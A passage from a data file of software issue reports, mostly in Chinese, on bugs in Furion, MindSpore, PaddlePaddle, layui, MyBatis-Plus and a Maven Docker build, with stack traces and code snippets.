DefaultDbContext 不能识别,"Furion 版本号 1.7.0 -&gt; 1.10.3 Web 项目类型 WebApi Mvc Razor Pages Blazor Server 发生了什么？ 脚手架安装 1.7.0 System.InvalidOperationException: No database provider has been configured for this DbContext. A provider can be configured by overriding the 'DbContext.OnConfiguring' method or by using 'AddDbContext' on the application service provider. If 'AddDbContext' is used, then also ensure that your DbContext type accepts a DbContextOptions object in its constructor and passes it to the base constructor for DbContext. at Microsoft.EntityFrameworkCore.Internal.DbContextServices.Initialize(IServiceProvider scopedProvider, IDbContextOptions contextOptions, DbContext context) at Microsoft.EntityFrameworkCore.DbContext.get_InternalServiceProvider() at Microsoft.EntityFrameworkCore.DbContext.Microsoft.EntityFrameworkCore.Infrastructure.IInfrastructure&lt;System.IServiceProvider&gt;.get_Instance() at Microsoft.EntityFrameworkCore.Infrastructure.Internal.InfrastructureExtensions.GetService[TService](IInfrastructure1 accessor) at Microsoft.EntityFrameworkCore.Infrastructure.DatabaseFacade.get_Dependencies() at Microsoft.EntityFrameworkCore.Infrastructure.DatabaseFacade.Microsoft.EntityFrameworkCore.Storage.IDatabaseFacadeDependenciesAccessor.get_Dependencies() at Microsoft.EntityFrameworkCore.RelationalDatabaseFacadeExtensions.GetFacadeDependencies(DatabaseFacade databaseFacade) 代码或代码仓库 注入了 DefaultDbContext 并且 public void ConfigureServices(IServiceCollection services) { services.AddDatabaseAccessor(options =&gt; { options.AddDbPool(); }, ""OpenApi.Database.Migrations""); } 在此处 private readonly ISystemService _systemService; private readonly IRepository _personRepository; public SystemAppService(ISystemService systemService, IRepository personRepository) { _systemService = systemService; _personRepository = personRepository; } 发生了异常 Sqlite SqlServer Mysql Oracle PGSql Firebird Cosmos   <code>: 1 accessor) at Microsoft.EntityFrameworkCore.Infrastructure.AccessorExtensions.GetService[TService](IInfrastructure /// &lt;summary&gt; /// 获取系统描述 /// &lt;/summary&gt; /// &lt;returns&gt;&lt;/returns&gt; public string GetDescription() { var persons = _personRepository.AsQueryable(false) .ProjectToType&lt;PersonDto&gt;(); return _systemService.GetDescription(); }"
【ST】【MS】【OPS】AdaptiveMaxPool2D算子正反向支持数据类型不一致,"AdaptiveMaxPool2D算子在mindspore 2.0master分支GPU、CPU后端用例执行dynamic_shape报错 / 硬件环境: /device GPU/CPU : -- MindSpore version : mindspore 2.0.0 commit_id = ''[sha1]:cd15cccd,[branch]:(HEAD,origin/master,origin/HEAD,master)'' -- Python version : -- OS platform and distribution : -- GCC/Compiler version : (/): /mode pynative /mode graph test_ms_ops_adaptivemaxpool2d_func_input_2x64x32x32_output_size_16x16_indices_true_fp16 test_ms_ops_adaptivemaxpool2d_func_input_2x64x32x32_output_size_16x16_indices_true_fp32 test_ms_ops_adaptivemaxpool2d_func_input_2x64x32x32_output_size_16x16_indices_false_fp16 test_ms_ops_adaptivemaxpool2d_func_input_2x64x32x32_output_size_nonexnone_indices_false_fp16 test_ms_ops_adaptivemaxpool2d_func_input_2x64x32x32_output_size_nonex10_indices_false_fp16 test_ms_ops_adaptivemaxpool2d_func_input_2x64x32x32_output_size_10xnone_indices_false_fp16 test_ms_ops_adaptivemaxpool2d_func_input_32x2x256x256_output_size_64_indices_false_fp16 test_ms_ops_adaptivemaxpool2d_func_input_32x2x256x256_output_size_64_indices_false_fp32 test_ms_ops_adaptivemaxpool2d_func_input_32x2x6x6_output_size_4_indices_false_fp16 test_ms_ops_adaptivemaxpool2d_func_input_32x2x6x6_output_size_4_indices_false_fp32 test_ms_ops_adaptivemaxpool2d_func_input_1x1x1x1_output_size_1_indices_false_fp16 test_ms_ops_adaptivemaxpool2d_func_input_32x256x128x256_output_size_32x30_indices_false_fp16 test_ms_ops_adaptivemaxpool2d_func_input_32x256x128x256_output_size_32x64_indices_false_fp16 test_ms_ops_adaptivemaxpool2d_func_input_32x256x128x256_output_size_32x30_indices_true_fp16 test_ms_ops_adaptivemaxpool2d_func_input_32x256x128x256_output_size_32x64_double_mode_fp16 test_ms_ops_adaptivemaxpool2d_func_input_32x256x128x256_output_size_32x64_double_mode_fp32 test_ms_ops_adaptivemaxpool2d_func_input_32x256x128x256_output_size_32x64_double_mode_fp64 export ME_DYNAMIC_SHAPE=1 export DEVICE_TYPE=CPU_X86 / export DEVICE_TYPE=GPU_PCIE pytest -vra test_ms_ops_adaptivemaxpool2d_func.py 用例执行通过 ../../../../../common/ms_aw/operator/nn/adaptivemaxpool2d_ops.py:76: in forward_cmp out_me = self.forward_mindspore_impl() ../../../../../common/ms_aw/operator/nn/adaptivemaxpool2d_ops.py:60: in forward_mindspore_impl output = net(input_x) ../../../../../common/utils/operator_helper.py:316: in call self.run_dynamic_shape(*args, **kwargs) ../../../../../common/utils/operator_helper.py:278: in run_dynamic_shape outputs_grad = GradOfAllInputs(self.net)(*args_grad, **kwargs) /home/jenkins0/.local/lib/python3.7/site-packages/mindspore/nn/cell.py:626: in call out = self.compile_and_run(*args) /home/jenkins0/.local/lib/python3.7/site-packages/mindspore/nn/cell.py:943: in compile_and_run self.compile(*inputs) /home/jenkins0/.local/lib/python3.7/site-packages/mindspore/nn/cell.py:917: in compile jit_config_dict=self._jit_config_dict) self = &lt;mindspore.common.api._CellGraphExecutor object at 0x7fe4942da090&gt;, obj = GradOfAllInputs&lt; (network): AdaptiveMaxPool2d&lt;&gt; phase = 'train.1669167997919528192.140618235005168.23', do_convert = True, jit_config_dict = {} args = (Tensor(shape=[32, 256, 128, 256], dtype=Float16, value= [[[[-1.6998e-02, 1.2002e+00, -1.5254e+00 ... -1.0059e-01, 3...0, 9.2188e-01, 1.6230e+00], [-6.2451e-01, -1.1914e+00, 1.0088e+00 ... 1.5078e+00, 8.8501e-02, -5.9277e-01]]]])) E TypeError: For primitive[AdaptiveMaxPool2DGrad], the input argument[argmax_dtype] must be a type of {Tensor[Int64]}, but got Tensor[Float16]. E E ---------------------------------------------------- E - The Traceback of Net Construct Code: E ---------------------------------------------------- E The function call stack (See file '/home/jenkins0/x00518866/solution_test/cases/04operator/12nn/adaptivemaxpool2d/adaptivemaxpool2d/rank_0/om/analyze_fail.dat' for more details. Get instructions about at https://www.mindspore.cn/search?inputValue=analyze_fail.dat): E # 0 In file /home/jenkins0/x00518866/solution_test/common/utils/operator_helper.py:49 E return self.grad(self.network)(*inputs) E ^ E # 1 In file /home/jenkins0/.local/lib/python3.7/site-packages/mindspore/ops/_grad/grad_nn_ops.py:471 E dx = adaptive_maxpool2d_grad(dy, x, index) E ^ E E ---------------------------------------------------- E - C++ Call Stack: (For framework developers) E ---------------------------------------------------- E mindspore/core/utils/check_convert_utils.cc:687 CheckTensorSubClass /home/jenkins0/.local/lib/python3.7/site-packages/mindspore/common/api.py:1310: TypeError 梁成辉   <code>: def compile(self, obj, *args, phase='predict', do_convert=True, jit_config_dict=None): """""" Compiles graph. Args: obj (Function/Cell): The function or cell instance need compile. args (tuple): Function or cell input arguments. phase (str): The name of compile phase. Default: 'predict'. do_convert (bool): When set to True, convert ME graph to GE graph after compiling graph. jit_config_dict (dict): Jit config for compile. Default: None. Return: Str, the full phase of the cell. Bool, if the graph has been compiled before, return False, else return True. """""" obj.__parse_method__ = 'construct' if not hasattr(obj, obj.__parse_method__): raise AttributeError( 'The class {} dose not have method {}'.format(obj.__class__.__name__, obj.__parse_method__)) args_list = args self.enable_tuple_broaden = False if hasattr(obj, ""enable_tuple_broaden""): self.enable_tuple_broaden = obj.enable_tuple_broaden self._graph_executor.set_enable_tuple_broaden(self.enable_tuple_broaden) key = self._graph_executor.generate_arguments_key(args_list, self.enable_tuple_broaden) obj.arguments_key = str(key) phase = phase + '.' + str(obj.create_time) + '.' + str(id(obj)) + '.' + obj.arguments_key if phase in obj.compile_cache and self.has_compiled(phase): logger.debug(""%r graph has existed."", phase) return phase, False obj.check_names() _check_full_batch() self._set_dataset_mode(args_list) self._set_compile_cache_dep_files(phase) enable_ge = context.get_context(""enable_ge"") self._graph_executor.set_weights_values(obj.parameters_dict()) if jit_config_dict: self._graph_executor.set_jit_config(jit_config_dict) result = self._graph_executor.compile(obj, args_list, phase, self._use_vm_mode()) analyze_fail.dat"
mindspore\ccsrc\kernel\oplib\super_bar.h need <optional> to compile,"since std::optional is in (for MSVC), need to add a header file to compile on Windows: , and I checked that it's OK to add with and / 硬件环境: /device ascend/GPU/CPU/kirin/等其他芯片 : -- MindSpore version : -- Python version : -- OS platform and distribution : -- GCC/Compiler version : (/): /mode pynative /mode graph Build from source See logs:   <code>: &lt;optional&gt; mindspore\ccsrc\kernel\oplib\super_bar.h #include &lt;optional&gt; &lt;optional&gt; MinGW64's GCC 12 MSVC 14.29.30133 source (2022/11/23 17:17 65ce258) Python 3.9.13 Windows 10 MSVC 14.29.30133 https://build.mindspore.cn/blue/rest/organizations/jenkins/pipelines/VS_GPU/runs/405/log/?start=0 D:\jenkins\agent-working-dir\workspace\Compile_VS_GPU\mindspore\mindspore\ccsrc\kernel/oplib/super_bar.h(34,15): error C2039: ""optional"": 不是 ""std"" 的成员 (编译源文件 D:\jenkins\agent-working-dir\workspace\Compile_VS_GPU\mindspore\mindspore\ccsrc\kernel\oplib\super_bar.cc) [D:\jenkins\agent-working-dir\workspace\Compile_VS_GPU\mindspore\build\mindspore\mindspore\ccsrc\kernel\_mindspore_kernel_obj.vcxproj]"
中端死代码优化可能导致业务逻辑变化,"问题场景 死代码中包含可能抛出异常的语句 测试用例 中端输出 *源码中的strS = CC.SS;被优化掉了 预期输出 Exception Finally PASS 实际输出 Finally Fail 这种场景下我们应该怎么选择？@fredchow   <code>: public class HelloWorld { private static String[] SS = {""PASS"", ""Fail""}; private static Container CC = null; public static void main(String[] args) { System.out.println(GetOutputString()); } private static String GetOutputString() { String[] strS = SS; try { if (SS.length &gt; 1) { strS = CC.SS; } return SS[1]; } catch (Exception e) { System.out.println(""Exception""); } finally { System.out.println(""Finally""); } return SS[0]; } } class Container { public String[] SS = null; public Container() {} public void Set(String[] ss) { SS = ss; } public String[] Get() { return SS; } } LOC 2 17 try { @label3 } intrinsiccall MPL_CLINIT_CHECK (addrof ptr $__cinf_Ljava_2Flang_2FSystem_3B) #Read from: Ljava_2Flang_2FSystem_3B_7Cout regassign ptr %17 (iread ptr &lt;* &lt;$MUIDUnifiedUndefTabEntry&gt;&gt; 1 (array 0 ptr &lt;* &lt;[5] &lt;$MUIDUnifiedUndefTabEntry&gt;&gt;&gt; (addrof ptr $__muid_data_undef_tab$$HelloWorld_dex, constval i64 2))) intrinsiccallassigned MCCLoadRefS (regread ptr %17) { regassign ref %3} regassign ref %13 (regread ref %3) dassign %Reg3_R1054 0 (regread ref %13) #LINE HelloWorld.java : 17, DEX_INSTIDX : 28 ||001c: const-string: ""Exception"" // string@0003 callassigned &amp;MCC_GetOrInsertLiteral (addrof ptr $_C_STR_50e9a8dbadbae17d540b62bd7e4acca2) { regassign ptr %10} #LINE HelloWorld.java : 17, DEX_INSTIDX : 30 ||001e: invoke-virtual: Ljava/io/PrintStream;.println:(Ljava/lang/String;)V // method@0007 icallassigned ( iread u64 &lt;* u64&gt; 0 (add ptr ( iread ptr &lt;* &lt;$__class_meta__&gt;&gt; 6 (iread ref &lt;* &lt;$Ljava_2Flang_2FObject_3B&gt;&gt; 1 (regread ref %13)), constval ptr 352)), regread ref %13, regread ptr %10) {} intrinsiccall MCCDecRef (addrof ptr %Reg3_R1054) endtry LOC 2 19"
删除demo目录下和book中重复的例子,demo目录下和book中重复的例子是否可以删除了？ @王小花不瞎搞 @ZRachel 目前demo目录如下，其中6个带*的demo，和book中完全重复。   <code>: ├── gan ├── image_classification * ├── introduction ├── mnist * ├── model_zoo ├── quick_start ├── recommendation * ├── semantic_role_labeling * ├── sentiment * ├── seqToseq * ├── sequence_tagging └── traffic_prediction
[CT][MS][CI] test_auto_tune task compile Failed,": /device ascend : -- MindSpore version : -- Python version : -- OS platform and distribution : -- GCC/Compiler version : test_auto_tune_mode_step1_rlga_step2_ga_net_only_ga_op   <code>: def test_auto_tune_infer_net_with_only_ga_op_in_rlga_mode_del_true(): np.random.seed(5) input_np = np.random.randn(8, 3, 12, 12).astype(np.float32) tune_bank_path = ""/tmp/auto_tune"" net1 = AllGAOpNet1(in_c=3, out_c=4, kernel_size=2) fact = AutoTuneFactory(auto_tune_mode=""RL,GA"", tune_bank_path=tune_bank_path) &gt; out = fact.auto_tune_infer_net(net1, input_np, del_tmp=True) tuning_scenarios.py:350: _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ tuning_scenarios.py:146: in auto_tune_infer_net output = net(input_x) /root/archiconda3/envs/vm3.7/lib/python3.7/site-packages/mindspore/nn/cell.py:385: in __call__ out = self.compile_and_run(*inputs) /root/archiconda3/envs/vm3.7/lib/python3.7/site-packages/mindspore/nn/cell.py:643: in compile_and_run self.compile(*inputs) /root/archiconda3/envs/vm3.7/lib/python3.7/site-packages/mindspore/nn/cell.py:630: in compile _executor.compile(self, *inputs, phase=self.phase, auto_parallel_mode=self._auto_parallel_mode) _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ self = &lt;mindspore.common.api._Executor object at 0xffffaaf5fad0&gt; obj = AllGAOpNet1&lt; (conv): Conv2d&lt;input_channels=3, output_channels=4, kernel_size=(2, 2), stride=(1, 1), pad_mode=same, p...se, weight_init=ones, bias_init=zeros, format=NCHW&gt; (avgpool): AvgPool2d&lt;kernel_size=1, stride=1, pad_mode=VALID&gt; &gt; phase = '0train.1625725304590768640', do_convert = True auto_parallel_mode = False args = (Tensor(shape=[8, 3, 12, 12], dtype=Float32, value= [[[[ 4.41227496e-01, -3.30870152e-01, 2.43077111e+00 ... -3.29869...00], [ 8.55138481e-01, 2.14212823e+00, -1.45184249e-01 ... -1.00409150e+00, -5.97638488e-01, 5.85508347e-02]]]]),) def compile(self, obj, *args, phase='predict', do_convert=True, auto_parallel_mode=False): """""" Compiles graph. Args: obj (Function/Cell): The function or cell instance need compile. args (tuple): Function or cell input arguments. phase (str): The name of compile phase. Default: 'predict'. do_convert (bool): When set to True, convert ME graph to GE graph after compiling graph. auto_parallel_mode: When set to True, use auto parallel mode to compile graph. Return: Str, the full phase of the cell. Bool, if the graph has been compiled before, return False, else return True. """""" args_names, args_list = _generate_pip_args(obj, *args) dic = dict(zip(args_names, args_list)) key = generate_key(phase, dic) obj.phase_prefix = str(key[1]) if 'export' in phase: phase = phase + '.' + obj.phase_prefix + '.' + str(obj.create_time) else: phase = obj.phase_prefix + phase + '.' + str(obj.create_time) if phase in self.compile_cache.keys(): logger.debug(""%r graph has existed."", phase) return phase, False obj.check_names() _check_full_batch() self._set_dataset_mode(args_list) is_sink_mode = args and isinstance(args[0], Tensor) and args[0].virtual_flag if auto_parallel_mode and _need_to_full() and not is_sink_mode and obj.auto_parallel_compile_and_run(): args_full = _to_full_tensor(args, _get_device_num(), _get_global_rank()) _, args_list = _generate_pip_args(obj, *args_full) enable_debug_runtime = context.get_context(""enable_debug_runtime"") enable_ge = context.get_context(""enable_ge"") use_vm = not enable_ge or (enable_debug_runtime and context.get_context(""mode"") == context.PYNATIVE_MODE) &gt; result = self._executor.compile(obj, args_list, phase, use_vm, self.queue_name) E RuntimeError: mindspore/ccsrc/backend/kernel_compiler/tbe/tbe_kernel_parallel_build.cc:99 TbeOpParallelBuild] task compile Failed, task id:7, cause:Fail trace: E In file /root/archiconda3/envs/vm3.7/lib/python3.7/site-packages/mindspore/nn/layer/pooling.py(302)/ return self.avg_pool(x)/ E In file /home/wty_workspace/MindSporeTest/auto_tune/tuning_scenarios.py(49)/ out = self.avgpool(x)/ E E E # /root/archiconda3/envs/vm3.7/lib/python3.7/site-packages/mindspore/common/api.py:531: RuntimeError =============================== warnings summary =============================== tuning_scenarios.py::test_auto_tune_infer_net_with_only_ga_op_in_rlga_mode_del_true tuning_scenarios.py::test_auto_tune_infer_net_with_only_ga_op_in_rlga_mode_del_true /root/archiconda3/envs/vm3.7/lib/python3.7/importlib/_bootstrap.py:219: RuntimeWarning: numpy.ufunc size changed, may indicate binary incompatibility. Expected 192 from C header, got 216 from PyObject return f(*args, **kwds)"
Submit MPI job failed,"通过v2版本的receiver提交mpi集群任务，报错信息如上。   <code>: Traceback (most recent call last): File ""/home/rd/paddle/output/submit.py"", line 303, in &lt;module&gt; no_prefix_train_args_dict, ).run() File ""/home/rd/paddle/output/submit.py"", line 77, in run self._do_poster_request() File ""/home/rd/paddle/output/submit.py"", line 168, in _do_poster_request connection = urllib2.urlopen(request) File ""/home/rd/.jumbo/lib/python2.7/urllib2.py"", line 126, in urlopen return _opener.open(url, data, timeout) File ""/home/rd/.jumbo/lib/python2.7/urllib2.py"", line 400, in open response = self._open(req, data) File ""/home/rd/.jumbo/lib/python2.7/urllib2.py"", line 418, in _open '_open', req) File ""/home/rd/.jumbo/lib/python2.7/urllib2.py"", line 378, in _call_chain result = func(*args) File ""/home/rd/.jumbo/lib/python2.7/site-packages/poster/streaminghttp.py"", line 142, in http_open return self.do_open(StreamingHTTPConnection, req) File ""/home/rd/.jumbo/lib/python2.7/urllib2.py"", line 1180, in do_open r = h.getresponse(buffering=True) File ""/home/rd/.jumbo/lib/python2.7/httplib.py"", line 1030, in getresponse response.begin() File ""/home/rd/.jumbo/lib/python2.7/httplib.py"", line 407, in begin version, status, reason = self._read_status() File ""/home/rd/.jumbo/lib/python2.7/httplib.py"", line 371, in _read_status raise BadStatusLine(line) httplib.BadStatusLine: ''"
关于上传图片限制大小问题,"data-size是什么单位？   <code>: &lt;a class=""margin-left-10"" data-file=""btn"" data-type=""jpg,png"" data-field=""logo"" data-size=""1024""&gt;上传图片&lt;/a&gt;"
发现一个可能是BUG也可能不是BUG的小XXX,"如题：我也很纠结到底是不是BUG，是不是问题，毕竟在使用上就不规范了【在一个页面重复引用同一个JS文件】 版本：所有版本 操作流程： 1、在页面重复引入 layui.js 2、监听 tab 选项卡点击事件，或者其他layui事件 操作结果： 每次点击都是根据引入的 layui.js 次数而做相同次数的 tab 点击事件 操作结果： 最后说一下：这应该吧，可能吧，或许吧，不算一个问题。只是在实际使用的时候，意外的在同一个页面重复引入2次了 layui.js，才发现这个奇葩的XXX，反正尽量避免同一个页面重复引用就能避免这个问题，所以完全可以无视这个XXX 把这个不算BUG的奇葩XXX提出来，希望闲心大佬勿怪，   <code>: &lt;!DOCTYPE html&gt; &lt;html lang=""en""&gt; &lt;head&gt; &lt;meta charset=""UTF-8""&gt; &lt;title&gt;Title&lt;/title&gt; &lt;link rel=""stylesheet"" href=""./css/layui.css""&gt; &lt;/head&gt; &lt;body&gt; &lt;div class=""layui-tab layui-tab-brief"" lay-filter=""test""&gt; &lt;ul class=""layui-tab-title""&gt; &lt;li class=""layui-this""&gt;选项卡1&lt;/li&gt; &lt;li&gt;选项卡2&lt;/li&gt; &lt;li&gt;选项卡3&lt;/li&gt; &lt;/ul&gt; &lt;div class=""layui-tab-content"" style=""padding: 5px""&gt; &lt;div class=""layui-tab-item layui-show""&gt; &lt;button onclick=""hello()""&gt;按钮&lt;/button&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;/body&gt; &lt;!--重复引入layui--&gt; &lt;script src=""./layui.js""&gt;&lt;/script&gt; &lt;script src=""./layui.js""&gt;&lt;/script&gt; &lt;script src=""./layui.js""&gt;&lt;/script&gt; &lt;script src=""./layui.js""&gt;&lt;/script&gt; &lt;!--重复引入jquery--&gt; &lt;script src=""../jquery.js""&gt;&lt;/script&gt; &lt;script src=""../jquery.js""&gt;&lt;/script&gt; &lt;script src=""../jquery.js""&gt;&lt;/script&gt; &lt;script src=""../jquery.js""&gt;&lt;/script&gt; &lt;script src=""../jquery.js""&gt;&lt;/script&gt; &lt;script&gt; layui.use('element', function() { var element = layui.element; element.on('tab(test)', function (data) { //打印时间戳，毫秒级别 console.error('我跟你说哦，你信不信我能一次输出4个，因为我重复引入了4次'); console.error((new Date()).valueOf()); }); }) function hello(){ console.error('啥，你在说啥，我咋不知道？'); console.error((new Date()).valueOf()); } &lt;/script&gt; &lt;/html&gt;"
use the same pattr of a layer during one training process,"I want to use the parameter of one layer calculate two same operation，how？ eg: here is a simple layer class, I only want one fc layer in my model, but I need to calculate two operation use this fc layer. If i define as follow, there are two different fc parameter. What I want is: output1 = fc(data1) output2 = fc(data2) but they use the same parameter for one fc layer, how? Then, is there a easy way to use BiDirectional LSTM in dygragh model, I want to define the param of BDLSTM in init function Thank you for answering.   <code>: any_layer(data1, data2) { output1 = fluid.layer.fc(input=data1) output2 = fluid.layer.fc(input=data2) }"
[BUG][MD]The error message is incorrect.,": /device gpu /device cpu : -- MindSpore version : -- Python version : -- OS platform and distribution : -- GCC/Compiler version : pytest -s test_func_usability_issues.py::test_func_usability_issues_06 pyfunc返回值错误，报错提示信息不正确 pyfunc返回值为none，提示返回值错误   <code>: def pass_func5(_): return None @pytest.mark.level('level2') def test_func_usability_issues_06(): # Map + pyfun异常 +多进程（报错），报错信息不清晰 data = ds.ManifestDataset(dataset_file_mf) data = data.map(operations=pass_func5, input_columns=[""image""], num_parallel_workers=1, python_multiprocessing=True) num_iter = 0 # with pytest.raises(RuntimeError, match=r""Invalid file, failed to parse manifest file:""): for _ in data.create_dict_iterator(output_numpy=True): num_iter += 1"
oracle主键问题,"以前的老项目，oracle主键为VARCHAR2(32)类型，MP主键必须为Long才可使用 MP能否支持类似 上面这种自定义返回主键类型，以方便改造老项目   <code>: &lt;!-- 配置oracle主键Sequence， 其他类型数据库，请配置相应的类型--&gt; &lt;bean id=""keyGenerator"" class=""com.baomidou.mybatisplus.incrementer.OracleKeyGenerator""&gt; &lt;property name=""ResultType"" value=""java.lang.String""/&gt; //默认为Long 不配置 配置则为String &lt;/bean&gt; &lt;selectKey resultType=""java.lang.String"" keyProperty=""roleId"" order=""BEFORE""&gt; &lt;![CDATA[ select SEQ_COMMON.nextval as roleId from dual ]]&gt; &lt;/selectKey&gt;"
[CT][MS][OCCM][coalesce]算子在gpu上出现精度问题,"算子在gpu上运行用例 test_p_coalesce_input_1x5_5_1_fp16 出现精度问题 def test_p_coalesce_input_1x5_5_1_fp16(): x_indices = Tensor(np.random.randint(0, 10, (1, 5)).astype(np.int64)) x_values = Tensor(np.random.randn(5, ).astype(np.float16)) x_shape = Tensor(np.random.randint(10, 28, (1,)).astype(np.int64)) fact = CoalesceMock(inputs=[x_indices, x_values, x_shape]) ../operations/test_coalesce.py:82: ../share/ops/primitive/coalesce_ops.py:99: in forward_cmp allclose_nparray(out_pytorch1, out_mindspore1, self.loss, self.loss) ../share/utils.py:31: in allclose_nparray _count_unequal_element(data_expected, data_me, rtol, atol) /mode graph   <code>: fact.forward_cmp()"
ernie model prediction problem,"1）PaddlePaddle版本：请提供您的PaddlePaddle版本号 1.7.2 2）GPU：，CUDA 9.2，CUDNN 7.3 4）系统环境：CentOS 6u3, py2 Error Message Summary: NotFoundError: DataType should be indicated by input Variable at scale. [Hint: Expected data_type != dafault_data_type, but received data_type:-1 == dafault_data_type:-1.] at (/home/users/dongdaxiang/Paddle/paddle/fluid/framework/operator.cc:1316) [operator &lt; scale &gt; error] 复现信息： 问题描述：基本定位在embedding_eltwise_layernorm_fuse_pass，在ernie模型上造成了以上报错，关闭掉所有pass可以跑通   <code>: import numpy as np import time import sys from paddle.fluid.core import PaddleTensor from paddle.fluid.core import AnalysisConfig from paddle.fluid.core import create_paddle_predictor fetch_list = ['embedding_0.tmp_0', 'embedding_1.tmp_0', 'embedding_2.tmp_0', 'layer_norm_6.tmp_2', 'layer_norm_12.tmp_2', 'layer_norm_18.tmp_2', 'layer_norm_2\ 4.tmp_2', 'dropout_7.tmp_0', 'dropout_16.tmp_0', 'dropout_25.tmp_0', 'dropout_34.tmp_0'] src_ids = [1, 3770, 2366, 3, 193, 12043, 2, 65, 179, 106, 286, 609, 3117, 184, 21, 497, 193, 1914, 1058, 82, 12043, 2] sent_ids = [0, 0, 0, 0, 0, 0, 0, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1] src_ids.extend([0]*(300 - len(src_ids))) sent_ids.extend([0]*(300 - len(sent_ids))) src_ids = np.array(src_ids).reshape((len(src_ids), 1)) sent_ids = np.array(sent_ids).reshape((len(sent_ids), 1)) model_path = ""ernie_model/"" config = AnalysisConfig(model_path) config.enable_use_gpu(100, 0) has_bug = True config.switch_ir_optim(has_bug) predictor = create_paddle_predictor(config) inputs = [PaddleTensor(src_ids[np.newaxis, :]), PaddleTensor(sent_ids[np.newaxis, :])] outputs = predictor.run(inputs) print(outputs)"
deepClone存在bug,"export function deepClone(source) { // 原来的 // if (!source &amp;&amp; typeof source !== 'object') { // throw new Error('error arguments', 'deepClone') // } }   <code>: // 建议改成 if (!source || typeof source !== 'object') { return source } const targetObj = source.constructor === Array ? [] : {} Object.keys(source).forEach(keys =&gt; { if (source[keys] &amp;&amp; typeof source[keys] === 'object') { targetObj[keys] = deepClone(source[keys]) } else { targetObj[keys] = source[keys] } }) return targetObj"
EOF Exception is not caught when using pyreader,"我在使用Pyreader做Bert fine-tuning阶段的训练，训练中发现当模型训练到最后，会报如下错误： 报错内容显示exe.run传入了一个空Tensor, 即shape=[]。 可是PyReader遇到文件尾应该会raise EOFException后退出，不会给空数据去训练。 于是我打印了更多log，log显示程序已经抛出了EOFException，但是没有被catch，这个问题应该解决。log如下： 如何复现这个问题： 按照这个repo的readme即可复现。默认的数据需要训练2个小时才报错，建议取少量数据，这样可在几分钟内复现错误。   <code>: PaddleCheckError: Expected ids_dims[ids_rank - 1] == 1, but received ids_dims[ids_rank - 1]:0 != 1:1. ShapeError: The last dimensions of the 'Ids' tensor must be 1. But received Ids's last dimensions = 0, Ids's shape = [0]. at [/home/users/dongdaxiang/Paddle/paddle/fluid/operators/lookup_table_op.cc:51] [operator &lt; lookup_table &gt; error]"
容器内构建报错,"pig版本: 3.5.2 是否修改包名: 无   <code>: FROM sreworks-registry.cn-beijing.cr.aliyuncs.com/mirror/maven:alpine AS build RUN sed -i 's/dl-cdn.alpinelinux.org/mirrors.aliyun.com/g' /etc/apk/repositories RUN apk add curl RUN mkdir /root/.m2/ &amp;&amp; curl https://sreworks.oss-cn-beijing.aliyuncs.com/resource/settings.xml -o /root/.m2/settings.xml COPY . /app WORKDIR /app RUN mvn spring-javaformat:validate &amp;&amp; mvn -Dmaven.test.skip=true clean package -U ### 报错信息 、截图 截图 [INFO] ------------------------------------------------------------------------ [INFO] Reactor Summary for pig 3.5.2: [INFO] [INFO] pig ................................................ FAILURE [ 6.997 s] [INFO] pig-register ....................................... SKIPPED [INFO] pig-common ......................................... SKIPPED [INFO] pig-common-core .................................... SKIPPED [INFO] pig-gateway ........................................ SKIPPED [INFO] pig-common-feign ................................... SKIPPED [INFO] pig-common-mybatis ................................. SKIPPED [INFO] pig-upms ........................................... SKIPPED [INFO] pig-upms-api ....................................... SKIPPED [INFO] pig-common-security ................................ SKIPPED [INFO] pig-common-log ..................................... SKIPPED [INFO] pig-auth ........................................... SKIPPED [INFO] pig-common-swagger ................................. SKIPPED [INFO] pig-upms-biz ....................................... SKIPPED [INFO] pig-common-bom ..................................... SKIPPED [INFO] pig-common-datasource .............................. SKIPPED [INFO] pig-common-job ..................................... SKIPPED [INFO] pig-common-seata ................................... SKIPPED [INFO] pig-visual ......................................... SKIPPED [INFO] pig-codegen ........................................ SKIPPED [INFO] pig-monitor ........................................ SKIPPED [INFO] pig-sentinel-dashboard ............................. SKIPPED [INFO] pig-xxl-job-admin .................................. SKIPPED [INFO] ------------------------------------------------------------------------ [INFO] BUILD FAILURE [INFO] ------------------------------------------------------------------------ [INFO] Total time: 20.886 s [INFO] Finished at: 2022-08-16T02:48:05Z [INFO] ------------------------------------------------------------------------ [ERROR] Failed to execute goal io.spring.javaformat:spring-javaformat-maven-plugin:0.0.34:validate (default-cli) on project pig: Execution default-cli of goal io.spring.javaformat:spring-javaformat-maven-plugin:0.0.34:validate failed: An API incompatibility was encountered while executing io.spring.javaformat:spring-javaformat-maven-plugin:0.0.34:validate: java.lang.UnsupportedClassVersionError: io/spring/javaformat/eclipse/jdt/jdk11/internal/formatter/DefaultCodeFormatter has been compiled by a more recent version of the Java Runtime (class file version 55.0), this version of the Java Runtime only recognizes class file versions up to 52.0"
软删除如果数据不存在，则报错,"Furion 版本号 2.2.6 Web 项目类型 WebApi Mvc Razor Pages Blazor Server 发生了什么？ 软删除时，数据不存在会报错 生成的sql在数据库里可以正常运行 Microsoft.EntityFrameworkCore.DbUpdateConcurrencyException: Database operation expected to affect 1 row(s) but actually affected 0 row(s). Data may have been modified or deleted since entities were loaded. See http://go.microsoft.com/fwlink/?LinkId=527962 for information on understanding and handling optimistic concurrency exceptions. at Microsoft.EntityFrameworkCore.Update.AffectedCountModificationCommandBatch.ThrowAggregateUpdateConcurrencyException(Int32 commandIndex, Int32 expectedRowsAffected, Int32 rowsAffected) at Microsoft.EntityFrameworkCore.Update.AffectedCountModificationCommandBatch.ConsumeResultSetWithoutPropagation(Int32 commandIndex, RelationalDataReader reader) at Microsoft.EntityFrameworkCore.Update.AffectedCountModificationCommandBatch.Consume(RelationalDataReader reader) at Microsoft.EntityFrameworkCore.Update.ReaderModificationCommandBatch.Execute(IRelationalConnection connection) at Microsoft.EntityFrameworkCore.Update.Internal.BatchExecutor.Execute(IEnumerable1 entries) at Microsoft.EntityFrameworkCore.ChangeTracking.Internal.StateManager.SaveChanges(IList3 operation, Func2 u) in D:\Code\Test\Furion\framework\Furion\DatabaseAccessor\Pools\DbContextPool.cs:line 125 at 